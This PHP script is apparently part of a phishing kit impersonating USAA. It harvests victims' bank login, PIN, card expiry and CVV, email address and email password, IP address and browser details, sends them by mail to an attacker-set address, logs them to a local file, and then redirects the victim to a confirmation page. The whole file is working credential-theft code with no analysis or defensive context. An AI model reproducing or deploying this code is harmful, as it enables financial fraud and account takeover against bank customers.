<?php
ini_set("output_buffering",4096);
@session_start();
ob_start();

include 'Email.php';

$ipaddress = $_SERVER['REMOTE_ADDR'];
$ipaddress2 = $_SERVER['HTTP_CLIENT_IP'];
$host = bin2hex ($_SERVER['HTTP_HOST']);
$timedate = date("D/M/d, Y g(idea) a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];




$host = bin2hex ($_SERVER['HTTP_HOST']);
$ip = getenv("REMOTE_ADDR");
$message .= "--------------[ USAA ]---------------------\n";
$message .= "OnlineID       : ".$_SESSION['j_username1']."\n";
$message .= "Password       : ".$_SESSION['j_password1']."\n";
$message .= "--------------[ USAA-PIN-Q]---------------------\n";
$message .= "Phone Number       : ".$_SESSION['iden1']."\n";
$message .= "USAA PIN           : ".$_POST['phone']."\n";
$message .= "EXP Date           : ".$_POST['exp']."\n";
$message .= "CVV Code           : ".$_POST['cvv']."\n";
$message .= "Email Address      : ".$_POST['e1']."\n";
$message .= "Email password     : ".$_POST['p1']."\n";
$message .= "--------------[ Email-AxiZ]---------------------\n";
$message .= "Email          : ".$_SESSION['EML1']."\n";
$message .= "Password       : ".$_SESSION['epass1']."\n";
$message .= "-----------------[ Real Master ]---------------------\n";
$message .= "|Client IP: ".$ipaddress2."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ipaddress ----\n";
$message .= "Browser                 :".$browserAgent."\n";
$message .= "DateTime                : ".$timedate."\n";
$subject = "xXxUSAA-NeWxXx $ipaddress";
$headers = "From: UnKnown <Source@Bourder.land>";
mail($SEND,$subject,$message,$headers);
$fp = fopen("../SM.txt","a");
fputs($fp,$message);
fclose($fp);

 
header("Location: confirmation.html?$host$host$host$host");
?>